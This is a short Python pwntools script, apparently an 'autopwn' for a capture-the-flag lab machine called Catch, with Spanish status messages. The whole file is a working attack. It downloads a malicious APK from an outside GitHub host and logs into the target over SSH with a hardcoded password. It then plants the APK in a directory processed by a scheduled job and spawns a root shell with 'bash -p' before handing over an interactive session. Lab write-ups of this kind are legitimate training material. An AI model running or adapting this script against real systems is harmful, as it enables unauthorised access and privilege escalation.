try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Catch ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

wget("https://github.com/GatoGamer1155/Imagenes-Repositorios/raw/main/privesc.apk", "privesc.apk")
request = ssh(host="10.10.11.150", user="will", password="s2#4Fg0_%3!")
shell = request.process("/bin/sh")
request.upload("privesc.apk")
print("[\033[1;34m*\033[1;37m] Esto tardará un minuto")
shell.sendline(b"mv privesc.apk /opt/mdm/apk_bin")
time.sleep(65)
shell.sendline(b"bash -p")
time.sleep(0.5)
shell.sendline(b"export HOME=/root; cd; echo $(whoami)")
shell.interactive()
